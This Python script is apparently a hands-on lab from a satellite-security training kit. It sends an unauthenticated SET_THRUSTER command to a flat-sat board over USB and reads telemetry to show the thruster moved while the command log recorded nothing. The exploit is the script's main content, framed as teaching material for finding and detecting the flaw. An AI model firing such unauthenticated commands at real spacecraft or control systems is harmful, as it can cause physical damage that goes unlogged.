#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_command_injection_usb.py -- move something physical through a command
# path that never asks who you are.
#
# SET_THRUSTER (0x04) takes two octets, thruster id and raw power, and the
# firmware clamps neither. An attacker does not need the command you
# protected. They need the one you forgot.
#
# The second half of the problem is the silence: SET_THRUSTER sends no
# acknowledgement, so the ground has no record it happened. The only evidence
# is the state change itself, on the next telemetry poll, if anyone compares.
#
# Expected: the thruster value changes on the board's console and on the
# PWNSAT-C3 gauge, with nothing in the command log to match it.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, TC_GET_PAYLOAD_STATUS, TC_GET_STATUS,  # noqa: E402
                     TC_SET_THRUSTER)

# The thruster values ride in SEND_TM (0x08), not in STATUS, and SEND_TM is a
# heartbeat every 14 to 30 seconds. Polling STATUS for them, which is what
# this lab used to do, shows the operator's view and never the change.
TM_THRUSTER_OFFSET = 17


def read_thrusters(fsat, seq, wait=35.0):
    """Both thruster powers, out of the next SEND_TM. None if none arrives."""
    for p in fsat.send(TC_GET_PAYLOAD_STATUS, b"", seq=seq & 0x3FFF, listen=wait):
        if p.apid != 0x08:
            continue
        body = fsat.plaintext(p)
        if len(body) > TM_THRUSTER_OFFSET + 1:
            return (body[TM_THRUSTER_OFFSET], body[TM_THRUSTER_OFFSET + 1])
    return None


def fmt(pair):
    return "not seen yet" if pair is None else f"0={pair[0]}  1={pair[1]}"


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--thruster-id", type=int, choices=[0, 1], default=0)
    ap.add_argument("--power", type=int, default=200, metavar="0-255")
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--restore", action="store_true", help="set the power back to zero")
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()
    if not 0 <= args.power <= 255:
        ap.error("--power must be 0-255")

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. state before ===")
        fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.2)
        before = read_thrusters(fsat, args.seq + 10)
        print(f"[*] thrusters before: {fmt(before)}")

        print(f"\n=== 2. thruster {args.thruster_id} to {args.power}, no credential ===")
        replies = fsat.send(TC_SET_THRUSTER,
                            bytes([args.thruster_id & 0xFF, args.power & 0xFF]),
                            seq=args.seq + 1, listen=1.0)
        for p in replies:
            if p.apid == 0x09:
                reason = fsat.plaintext(p).split(b"\x00", 1)[0]
                print(f"[!] the board refused: "
                      f"{reason.decode('ascii', 'replace').strip()}")
        print("[*] Note what did NOT come back: SET_THRUSTER acknowledges nothing.")

        print("\n=== 3. state after ===")
        after = read_thrusters(fsat, args.seq + 11)
        print(f"[*] thrusters after:  {fmt(after)}")

        if before is None or after is None:
            print("[*] no telemetry frame arrived in the window. The values "
                  "are on the PWNSAT-C3 panel; give it half a minute.")
        elif after[args.thruster_id] == args.power:
            print(f"[+] thruster {args.thruster_id} is at {args.power}, and "
                  f"nothing authenticated the command that put it there.")
        elif before == after:
            print("[-] the values did not move. The command was accepted and "
                  "had no effect, which is worth a finding of its own.")

        if args.restore:
            print("\n=== 4. putting it back ===")
            fsat.send(TC_SET_THRUSTER, bytes([args.thruster_id & 0xFF, 0]),
                      seq=args.seq + 3, listen=1.0)

    print("\nWatch the telemetry panel, not the console's own log. The gap "
          "between them is the finding.")
    print("\nWhat the sensor should have shown: a critical command that executed "
          "with the secure link off.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
